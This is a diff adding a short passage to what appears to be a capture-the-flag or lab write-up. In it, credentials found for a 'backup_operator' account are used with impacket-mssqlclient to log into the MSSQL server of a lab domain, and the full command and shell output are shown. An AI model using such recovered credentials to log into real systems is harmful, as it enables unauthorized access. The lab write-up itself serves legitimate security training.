@@ -993,3 +993,21 @@ Notes:
 * Backup and restore operations were executed using the MSSQL user backup_operator.
 ```
 
+So with the creds that get me access over mssql i can login using the impacket script
+
+```python
+impacket-mssqlclient northstone.local/backup_operator:'BackupOps2026!'@dc.northstone.local
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC): Line 1: Changed database context to 'master'.
+[*] INFO(DC): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (backup_operator  backup_operator@master)>
+
+
+```
